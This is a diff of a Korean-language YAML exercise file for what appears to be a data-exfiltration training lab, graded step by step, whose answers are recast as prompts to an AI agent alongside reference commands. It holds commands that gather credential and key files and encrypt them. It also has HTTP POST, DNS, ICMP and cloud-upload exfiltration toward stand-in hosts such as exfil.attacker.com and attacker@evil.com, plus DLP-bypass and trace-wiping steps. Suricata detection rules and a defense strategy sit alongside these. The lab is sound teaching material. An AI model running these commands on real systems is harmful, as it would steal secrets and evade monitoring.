@@ -19,11 +19,13 @@ steps:
   hint: find 명령으로 .conf, .key, .pem, .env 파일을 검색한다
   category: recon
   points: 10
-  answer: mkdir -p /tmp/exfil_staging && find /etc /home -name '*.conf' -o -name '*.key'
-    -o -name '*.pem' -o -name '.env' 2>/dev/null | head -10 > /tmp/exfil_staging/file_list.txt
-    && echo 'hostname:' $(hostname) > /tmp/exfil_staging/sysinfo.txt && id >> /tmp/exfil_staging/sysinfo.txt
-    && ip addr | grep inet >> /tmp/exfil_staging/sysinfo.txt && cat /tmp/exfil_staging/file_list.txt
-    && echo '---' && cat /tmp/exfil_staging/sysinfo.txt
+  answer: '🤖 프롬프트: 유출 대상 데이터를 수집해줘
+
+    📎 참고 (CLI): mkdir -p /tmp/exfil_staging && find /etc /home -name ''*.conf'' -o
+    -name ''*.key'' -o -name ''*.pem'' -o -name ''.env'' 2>/dev/null | head -10 >
+    /tmp/exfil_staging/file_list.txt && echo ''hostname:'' $(hostname) > /tmp/exfil_staging/sysinfo.txt
+    && id >> /tmp/exfil_staging/sysinfo.txt && ip addr | grep inet >> /tmp/exfil_staging/sysinfo.txt
+    && cat /tmp/exfil_staging/file_list.txt && echo ''---'' && cat /tmp/exfil_staging/sysinfo.txt'
   answer_detail: 데이터 유출의 첫 단계는 스테이징(Staging)이다. 민감 파일을 하나의 디렉토리에 수집하고, 압축/암호화 후 유출한다.
     시스템 정보, 네트워크 구성, 자격증명 파일이 주요 대상이다. MITRE ATT&CK T1074(Data Staged)에 해당한다.
   verify:
@@ -43,10 +45,12 @@ steps:
   hint: tar czf로 압축하고, openssl enc -aes-256-cbc로 암호화한다
   category: exploit
   points: 10
-  answer: tar czf /tmp/exfil_data.tar.gz -C /tmp/exfil_staging . && openssl enc -aes-256-cbc
-    -salt -in /tmp/exfil_data.tar.gz -out /tmp/exfil_data.enc -pass pass:ExfilKey2026
-    -pbkdf2 && ls -la /tmp/exfil_data.enc && echo '' && echo 'Original:' && ls -la
-    /tmp/exfil_data.tar.gz && echo 'Encrypted:' && file /tmp/exfil_data.enc
+  answer: '🤖 프롬프트: 수집된 데이터를 tar로 압축하고 openssl로 AES-256 암호화해줘
+
+    📎 참고 (CLI): tar czf /tmp/exfil_data.tar.gz -C /tmp/exfil_staging . && openssl
+    enc -aes-256-cbc -salt -in /tmp/exfil_data.tar.gz -out /tmp/exfil_data.enc -pass
+    pass:ExfilKey2026 -pbkdf2 && ls -la /tmp/exfil_data.enc && echo '''' && echo ''Original:''
+    && ls -la /tmp/exfil_data.tar.gz && echo ''Encrypted:'' && file /tmp/exfil_data.enc'
   answer_detail: 암호화는 네트워크 전송 시 DLP/IDS가 내용을 분석하지 못하게 한다. AES-256-CBC는 강력한 대칭 암호화이며,
     -pbkdf2로 키 유도를 강화한다. 실제 APT 그룹은 커스텀 암호화나 XOR 인코딩으로 시그니처 탐지를 회피하기도 한다.
   verify:
@@ -65,8 +69,11 @@ steps:
   hint: base64로 인코딩하고, curl -X POST -d로 전송한다
   category: exploit
   points: 10
-  answer: 'ENCODED=$(base64 -w 0 /tmp/exfil_data.enc) && echo "Data size: $(echo -n
-    $ENCODED | wc -c) bytes (base64)" && echo "First 100 chars: ${ENCODED:0:100}..."
+  answer: '🤖 프롬프트: HTTP를 통한 데이터 유출을 시뮬레이션하라. curl POST 요청으로 암호화된 데이터를 Base64 인코딩하여
+    전송해줘
+
+    📎 참고 (CLI): ENCODED=$(base64 -w 0 /tmp/exfil_data.enc) && echo "Data size: $(echo
+    -n $ENCODED | wc -c) bytes (base64)" && echo "First 100 chars: ${ENCODED:0:100}..."
     && curl -s -X POST -d "upload=$ENCODED" http://10.20.30.80:3000/api/Feedbacks
     -o /dev/null -w ''HTTP Status: %{http_code}'' 2>/dev/null && echo '''''
   answer_detail: HTTP POST를 통한 데이터 유출은 가장 일반적인 방법이다. 정상적인 웹 트래픽으로 위장할 수 있으며, HTTPS를
@@ -89,8 +96,10 @@ steps:
   hint: base32로 인코딩하고 63자씩 분할하여 DNS 쿼리 라벨로 사용한다
   category: exploit
   points: 10
-  answer: 'echo ''secret data for DNS exfil'' | base32 | tr -d ''='' | fold -w 50
-    | head -5 | while read chunk; do echo "DNS query: ${chunk}.exfil.attacker.com";
+  answer: '🤖 프롬프트: DNS를 통한 데이터 유출을 시뮬레이션해줘
+
+    📎 참고 (CLI): echo ''secret data for DNS exfil'' | base32 | tr -d ''='' | fold -w
+    50 | head -5 | while read chunk; do echo "DNS query: ${chunk}.exfil.attacker.com";
     done && echo '''' && echo ''DNS exfil characteristics:'' && echo ''- Max label
     length: 63 chars'' && echo ''- Max query length: 253 chars'' && echo ''- Throughput:
     ~10-50 KB/min'' && echo ''- Detection: query length, entropy, volume'''
@@ -114,7 +123,9 @@ steps:
   hint: xxd로 데이터를 16진수로 변환하고 ping -p 옵션으로 전송한다
   category: exploit
   points: 10
-  answer: 'DATA_HEX=$(echo -n ''exfil'' | xxd -p) && echo "Data in hex: $DATA_HEX"
+  answer: '🤖 프롬프트: ICMP를 통한 데이터 유출을 시뮬레이션하라. ping의 데이터 필드에 정보를 포함하여 전송하는 원리를 보여라해줘
+
+    📎 참고 (CLI): DATA_HEX=$(echo -n ''exfil'' | xxd -p) && echo "Data in hex: $DATA_HEX"
     && echo "Sending via ICMP data field:" && ping -c 1 -p $DATA_HEX -s 64 10.20.30.80
     2>&1 | head -5 && echo '''' && echo ''ICMP exfil tools: icmpsh, icmp-exfil, ptunnel''
     && echo ''Detection: ICMP payload size > 64 bytes, high frequency'''
@@ -138,12 +149,14 @@ steps:
   hint: cat으로 이미지와 데이터를 결합하거나, echo >> 로 파일 끝에 데이터를 추가한다
   category: exploit
   points: 10
-  answer: 'echo -e ''GIF89a\x01\x00\x01\x00\x00\x00\x00;'' > /tmp/cover.gif && echo
-    ''SECRET: This is hidden exfiltration data'' >> /tmp/cover.gif && echo ''=== Steganography
-    Simulation ==='' && echo ''Cover file:'' && file /tmp/cover.gif && echo ''Content:''
-    && strings /tmp/cover.gif && echo '''' && echo ''Real stego tools:'' && echo ''-
-    steghide: embed in JPEG/BMP/WAV/AU'' && echo ''- openstego: LSB embedding'' &&
-    echo ''- snow: whitespace steganography in text'''
+  answer: '🤖 프롬프트: 스테가노그래피를 사용하여 이미지 파일에 데이터를 숨기는 원리를 시뮬레이션해줘
+
+    📎 참고 (CLI): echo -e ''GIF89a\x01\x00\x01\x00\x00\x00\x00;'' > /tmp/cover.gif &&
+    echo ''SECRET: This is hidden exfiltration data'' >> /tmp/cover.gif && echo ''===
+    Steganography Simulation ==='' && echo ''Cover file:'' && file /tmp/cover.gif
+    && echo ''Content:'' && strings /tmp/cover.gif && echo '''' && echo ''Real stego
+    tools:'' && echo ''- steghide: embed in JPEG/BMP/WAV/AU'' && echo ''- openstego:
+    LSB embedding'' && echo ''- snow: whitespace steganography in text'''
   answer_detail: 스테가노그래피는 데이터를 무해한 파일(이미지, 오디오)에 숨기는 기법이다. LSB(Least Significant Bit)
     인코딩은 픽셀 최하위 비트를 변경하여 육안으로 식별할 수 없게 데이터를 숨긴다. 파일 끝 추가(EOF append)는 가장 단순한 기법이며,
     steghide는 JPEG에 AES 암호화된 데이터를 삽입한다.
@@ -165,10 +178,12 @@ steps:
   hint: split 명령으로 파일을 분할하고, 일정 간격으로 전송한다
   category: exploit
   points: 10
-  answer: 'split -b 100 /tmp/exfil_data.enc /tmp/chunk_ && echo ''=== Chunked Exfiltration
-    ==='' && ls -la /tmp/chunk_* && echo '''' && echo ''Simulating time-delayed transfer:''
-    && for chunk in /tmp/chunk_*; do echo "$(date ''+%H:%M:%S'') Sending: $chunk ($(wc
-    -c < $chunk) bytes)"; done && rm -f /tmp/chunk_*'
+  answer: '🤖 프롬프트: 데이터를 여러 조각으로 분할하여 시간차를 두고 유출하는 기법을 시뮬레이션해줘
+
+    📎 참고 (CLI): split -b 100 /tmp/exfil_data.enc /tmp/chunk_ && echo ''=== Chunked
+    Exfiltration ==='' && ls -la /tmp/chunk_* && echo '''' && echo ''Simulating time-delayed
+    transfer:'' && for chunk in /tmp/chunk_*; do echo "$(date ''+%H:%M:%S'') Sending:
+    $chunk ($(wc -c < $chunk) bytes)"; done && rm -f /tmp/chunk_*'
   answer_detail: 청크 기반 유출은 대용량 데이터를 작은 조각으로 분할하여 시간차를 두고 전송한다. DLP의 크기 기반 임계값과 단일
     전송 탐지를 회피한다. 실제 APT 그룹은 업무 시간에만 소량씩, 정상 트래픽 패턴과 유사하게 전송하여 이상행위 탐지를 어렵게 만든다.
   verify:
@@ -187,8 +202,9 @@ steps:
   hint: AWS S3, Google Cloud Storage 등의 API 형식으로 업로드 요청을 시뮬레이션한다
   category: exploit
   points: 10
-  answer: "echo -e '=== Cloud Storage Exfiltration ===\\n\\n[AWS S3]\\ncurl \\\n \
-    \    -X PUT -T /tmp/exfil_data.enc \\\\\\n  https://attacker-bucket.s3.amazonaws.com/data.enc\
+  answer: "\U0001F916 프롬프트: 클라우드 스토리지를 통한 데이터 유출을 시뮬레이션하라. curl로 클라우드 API 형태의 업로드\
+    \ 요청을 구성해줘\n\U0001F4CE 참고 (CLI): echo -e '=== Cloud Storage Exfiltration ===\\\
+    n\\n[AWS S3]\\ncurl \\\n     -X PUT -T /tmp/exfil_data.enc \\\\\\n  https://attacker-bucket.s3.amazonaws.com/data.enc\
     \ \\\\\\n \\\n     -H \"Authorization: AWS AKIAIOSFODNN7EXAMPLE:signature\"\\\
     n\\n[Google Cloud Storage]\\ncurl \\\n     -X POST -T /tmp/exfil_data.enc \\\\\
     \\n  https://storage.googleapis.com/upload/storage/v1/b/bucket/o \\\\\\n \\\n\
@@ -226,8 +242,10 @@ steps:
   hint: curl --mail-from --mail-rcpt 또는 sendmail 명령을 사용한다
   category: exploit
   points: 10
-  answer: 'echo -e ''=== Email-Based Exfiltration ===\n\n[Method 1: SMTP via curl]\ncurl
-    --url smtp://mail.server:25 \\\n  --mail-from sender@lab.local \\\n  --mail-rcpt
+  answer: '🤖 프롬프트: email을 통한 데이터 유출을 분석하라. SMTP를 사용하여 암호화된 데이터를 첨부파일로 전송하는 과정을 시뮬레이션해줘
+
+    📎 참고 (CLI): echo -e ''=== Email-Based Exfiltration ===\n\n[Method 1: SMTP via
+    curl]\ncurl --url smtp://mail.server:25 \\\n  --mail-from sender@lab.local \\\n  --mail-rcpt
     attacker@evil.com \\\n  -T email.txt\n\n[Method 2: Base64 in email body]\nDATA=$(base64
     /tmp/exfil_data.enc)\necho "Subject: Report" | sendmail -f user@lab.local attacker@evil.com\n\n[Method
     3: Draft folder staging]\n- Save data in email draft (IMAP)\n- Retrieve from external
@@ -256,16 +274,18 @@ steps:
   hint: USB 장치 연결 감지, Bluetooth 파일 전송 등을 다룬다
   category: analysis
   points: 10
-  answer: 'echo ''=== Physical Exfiltration Channels ==='' && echo '''' && echo ''[USB
-    Storage]'' && lsusb 2>/dev/null | head -5 && echo ''Detection: USB device insertion
-    logs (udev/Sysmon)'' && echo '''' && echo ''[Bluetooth]'' && echo ''hcitool scan
-    -> discover nearby devices'' && echo ''obexftp -b MAC -p file -> transfer via
-    OBEX'' && echo '''' && echo ''[Other Channels]'' && echo ''- Screen capture /
-    photography'' && echo ''- Printed documents'' && echo ''- Audio (ultrasonic data
-    transmission)'' && echo ''- WiFi (rogue AP for data transfer)'' && echo '''' &&
-    echo ''[Defense]'' && echo ''- USB device control (endpoint DLP)'' && echo ''-
-    Disable Bluetooth on sensitive systems'' && echo ''- Screen watermarking'' &&
-    echo ''- Physical security controls'''
+  answer: '🤖 프롬프트: 물리적 매체를 통한 데이터 유출을 분석하라. USB, Bluetooth 등 오프라인 채널의 위험성을 문서화해줘
+
+    📎 참고 (CLI): echo ''=== Physical Exfiltration Channels ==='' && echo '''' && echo
+    ''[USB Storage]'' && lsusb 2>/dev/null | head -5 && echo ''Detection: USB device
+    insertion logs (udev/Sysmon)'' && echo '''' && echo ''[Bluetooth]'' && echo ''hcitool
+    scan -> discover nearby devices'' && echo ''obexftp -b MAC -p file -> transfer
+    via OBEX'' && echo '''' && echo ''[Other Channels]'' && echo ''- Screen capture
+    / photography'' && echo ''- Printed documents'' && echo ''- Audio (ultrasonic
+    data transmission)'' && echo ''- WiFi (rogue AP for data transfer)'' && echo ''''
+    && echo ''[Defense]'' && echo ''- USB device control (endpoint DLP)'' && echo
+    ''- Disable Bluetooth on sensitive systems'' && echo ''- Screen watermarking''
+    && echo ''- Physical security controls'''
   answer_detail: 물리적 유출 채널은 네트워크 기반 DLP로 탐지할 수 없다. USB 대용량 저장장치, Bluetooth 파일 전송,
     화면 촬영, 인쇄물 등이 포함된다. 엔드포인트 DLP로 USB 장치를 제어하고, Bluetooth를 비활성화하며, 화면 워터마킹으로 스크린
     캡처를 추적할 수 있다.
@@ -291,15 +311,18 @@ steps:
   hint: HTTP, DNS, ICMP, Email 등 각 채널의 특성을 표로 정리한다
   category: analysis
   points: 10
-  answer: 'echo -e ''=== Exfiltration Channel Comparison ===\n\nChannel      | Bandwidth   |
-    Stealth  | Availability | Detection\n------------ | ----------- | -------- | ------------
-    | ----------\nHTTPS        | High (MB/s) | Medium   | Usually      | DLP, proxy\nDNS          |
-    Low (KB/s)  | High     | Almost always| DNS analytics\nICMP         | Low (KB/s)  |
-    High     | Usually      | Payload analysis\nEmail        | Medium      | Medium   |
-    Usually      | Email DLP\nCloud        | High        | High     | Varies       |
-    CASB\nSteganography| Low         | Very High| Always       | Stego analysis\nPhysical     |
-    High        | High     | Physical     | Endpoint DLP\n\nOptimal strategy: Combine
-    channels for redundancy\nAdapt to target environment restrictions'''
+  answer: '🤖 프롬프트: 데이터 유출 속도와 은닉성의 트레이드오프를 분석해줘
+
+    📎 참고 (CLI): echo -e ''=== Exfiltration Channel Comparison ===\n\nChannel      |
+    Bandwidth   | Stealth  | Availability | Detection\n------------ | -----------
+    | -------- | ------------ | ----------\nHTTPS        | High (MB/s) | Medium   |
+    Usually      | DLP, proxy\nDNS          | Low (KB/s)  | High     | Almost always|
+    DNS analytics\nICMP         | Low (KB/s)  | High     | Usually      | Payload
+    analysis\nEmail        | Medium      | Medium   | Usually      | Email DLP\nCloud        |
+    High        | High     | Varies       | CASB\nSteganography| Low         | Very
+    High| Always       | Stego analysis\nPhysical     | High        | High     | Physical     |
+    Endpoint DLP\n\nOptimal strategy: Combine channels for redundancy\nAdapt to target
+    environment restrictions'''
   answer_detail: 유출 채널 선택은 데이터 양, 시간 제약, 네트워크 환경에 따라 달라진다. 대용량 데이터는 HTTPS/Cloud가,
     제한된 환경에서는 DNS/ICMP가 적합하다. APT 그룹은 여러 채널을 병행하여 한 채널이 차단되어도 유출을 계속한다. 방어는 모든 채널을
     동시에 모니터링해야 한다.
@@ -325,7 +348,9 @@ steps:
   hint: 내용 검사, 패턴 매칭, 행위 분석 등 DLP의 각 탐지 기법에 대한 우회를 설명한다
   category: exploit
   points: 10
-  answer: 'echo -e ''=== DLP Bypass Techniques ===\n\n[Content Inspection Bypass]\n1.
+  answer: '🤖 프롬프트: DLP(Data Loss Prevention) 우회 기법을 분석해줘
+
+    📎 참고 (CLI): echo -e ''=== DLP Bypass Techniques ===\n\n[Content Inspection Bypass]\n1.
     Encryption: AES/XOR makes content unreadable\n2. Encoding: Base64, custom encoding
     schemes\n3. Splitting: Divide data below inspection threshold\n\n[Pattern Matching
     Bypass]\n4. Obfuscation: Replace patterns (SSN: XXX-XX-XXXX -> encoded)\n5. File
@@ -361,7 +386,9 @@ steps:
   hint: alert dns/http 규칙에서 content, dsize, threshold 옵션을 사용한다
   category: defense
   points: 10
-  answer: 'echo -e ''=== Suricata Exfiltration Detection Rules ===\n\n# DNS Tunneling:
+  answer: '🤖 프롬프트: 유출 탐지를 위한 Suricata 규칙을 구현 방법을 설명하고 예시 코드를 보여줘
+
+    📎 참고 (CLI): echo -e ''=== Suricata Exfiltration Detection Rules ===\n\n# DNS Tunneling:
     Long subdomain queries\nalert dns any any -> any 53 (msg:"Possible DNS tunneling
     - long query"; dns.query; content:"."  ; pcre:"/^[a-zA-Z0-9]{30,}\\./"; threshold:type
     threshold, track by_src, count 10, seconds 60; sid:1000001; rev:1;)\n\n# HTTP
@@ -400,9 +427,11 @@ steps:
   hint: shred 또는 rm으로 파일을 삭제하고, 삭제를 확인한다
   category: analysis
   points: 5
-  answer: shred -u /tmp/exfil_data.enc /tmp/exfil_data.tar.gz 2>/dev/null; rm -rf
-    /tmp/exfil_staging /tmp/cover.gif && echo 'Staging area cleaned' && ls /tmp/exfil_*
-    2>/dev/null || echo 'All exfil files removed'
+  answer: '🤖 프롬프트: 실습 환경을 정리해줘
+
+    📎 참고 (CLI): shred -u /tmp/exfil_data.enc /tmp/exfil_data.tar.gz 2>/dev/null; rm
+    -rf /tmp/exfil_staging /tmp/cover.gif && echo ''Staging area cleaned'' && ls /tmp/exfil_*
+    2>/dev/null || echo ''All exfil files removed'''
   answer_detail: 데이터 유출 실습 후 모든 민감 파일을 안전하게 삭제해야 한다. shred는 파일을 무작위 데이터로 덮어쓴 후 삭제하여
     복구를 방지한다. 실제 공격에서 APT 그룹도 안티포렌식 기법으로 흔적을 제거한다.
   verify:
@@ -420,7 +449,9 @@ steps:
   hint: 각 유출 채널별 탐지와 방어 기법을 매핑하여 종합 전략을 수립한다
   category: defense
   points: 15
-  answer: 'cat > /tmp/exfil_defense.txt << ''EOF''
+  answer: '🤖 프롬프트: 데이터 유출 방어 전략을 종합하여 /tmp/exfil_defense 구현 방법과 예시를 설명해줘
+
+    📎 참고 (CLI): cat > /tmp/exfil_defense.txt << ''EOF''
 
     === Data Exfiltration Defense Strategy ===
 
@@ -554,7 +585,17 @@ steps:
     field: stdout
   target_vm: attacker
   risk_level: low
-  answer: ''
+  answer: '🤖 프롬프트: 다음 작업들을 순서대로 수행해줘:
+
+    1) 유출 대상 데이터를 수집해줘
+
+    2) 수집된 데이터를 tar로 압축하고 openssl로 AES-256 암호화해줘
+
+    3) HTTP를 통한 데이터 유출을 시뮬레이션하라. curl POST 요청으로 암호화된 데이터를 Base64 인코딩하여 전송해줘
+
+    4) DNS를 통한 데이터 유출을 시뮬레이션해줘
+
+    5) ICMP를 통한 데이터 유출을 시뮬레이션하라. ping의 데이터 필드에 정보를 포함하여 전송하는 원리를 보여라해줘'
   answer_detail: Bastion이 5개 작업을 순차적으로 계획(planning)하고 실행(executing)한 뒤 종합 분석(validating)하는
     다단계 작업.
   script: ''
